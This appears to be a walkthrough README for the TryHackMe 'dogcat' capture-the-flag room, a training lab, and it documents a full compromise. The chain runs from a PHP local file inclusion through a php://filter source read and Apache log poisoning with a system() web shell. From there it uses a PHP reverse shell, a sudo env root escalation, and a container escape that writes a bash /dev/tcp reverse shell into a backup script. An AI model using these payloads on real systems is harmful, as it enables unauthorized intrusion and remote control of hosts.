# dogcat CTF - TryHackMe Room
# **!! SPOILERS !!**
#### This repository documents my walkthrough for the **dogcat** CTF challenge on [TryHackMe](https://tryhackme.com/room/dogcat). 
---

we see open ports 22 and 80

![scn](img/scn.png "scn")

here is a main site, we can pick between a dog and cat picture

![mp](img/mp.png "mp")

if we take a look a the source code we see that picture location is: `dogs/9.jpg` we can try to access this picture directly via link `http://IP/dogs/9.jpg`

![sc](img/sc.png "sc")

![pc](img/pc.png "pc")

by trying to manipulate the parameter we see some first errors

![pw](img/pw.png "pw")

next if we try to change the parameter to dogs we see php errors

```
Warning: include(dogs.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24

Warning: include(): Failed opening 'dogs.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24
```

![er1](img/er1.png "er1")

now if we try to include the index.php we see diffrent errors

![id](img/id.png "id")

```
Warning: include(dogsindex.php.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24

Warning: include(): Failed opening 'dogsindex.php.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24
```

first we see that one `.php` was added to our path that we tried to access

we can try with some php wrappers

we can try to use 

```
http://10.10.211.105/?view=php://filter/convert.base64-encode/resource=dogs/../index    # we use index without .php, it will be completed by server
```

![wr](img/wr.png "wr")

no we need to simply decode from base64

```index.php

        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
```

now from source code we know about `ext` parameter, now we can try to use LFI to access /etc/passwd by using parameters view and ext, `/?view=dogs/../../../../../etc/&ext=passwd` so the result will be `dogs/../../../../../etc/passwd`

![p](img/p.png "p")

from passwd file we dont see any user with home folder, so we probably wont find ssh key

we can try checking apache logs in /var/log/apache2/access.log

![lg](img/lg.png "lg")

it works we see our tries to access the server

now we can change User-Agent header and try log poissoning

![pois](img/pois.png "pois")

we see our changed User-Agent reflected in page source

now we can try to insert some php code 

```
<?php system($_GET['cmd']); ?>
```

then we add cmd parameter to our request and we see ls output, now we have RCE from LFI

![ls](img/ls.png "ls")

we can confirm by using id command

![idd](img/idd.png "idd")

now we need to use some php reverse shell, we can use this one but we need to url encode special characters 

```
php -r '$sock=fsockopen("10.X.X.X",8888);system("/bin/bash <&3 >&3 2>&3");'
```

![rs](img/rs.png "rs")

now we have shell access as www-data

![www](img/www.png "www")

we found first and second flag

![f1](img/f1.png "f1")

![f2](img/f2.png "f2")

looking at sudo -l and then checking GTFObins we have very easy way to become root

![sdl](img/sdl.png "sdl")

![gt](img/gt.png "gt")

```
sudo /usr/bin/env /bin/sh
```

now we have root access and we can grab third flag from root directory

![f3](img/f3.png "f3")

we might be inside container, we cant use python to upgrade shell and also we see .dockerenv

![op](img/op.png "op")

in /opt we see some script and tar file

![bc](img/bc.png "bc")

we can try to manipulate the script to escape the container 

```
$ cd /opt/backups
$ echo "#!/bin/bash" > backup.sh
$ echo "/bin/bash -c 'bash -i >& /dev/tcp/10.14.91.59/9999 0>&1'" >> backup.sh
```

![rss](img/rss.png "rss")

now we wait for a short while and we are hit by another reverse shell 

we can grab last flag

![f4](img/f4.png "f4")

# MACHINE PWNED
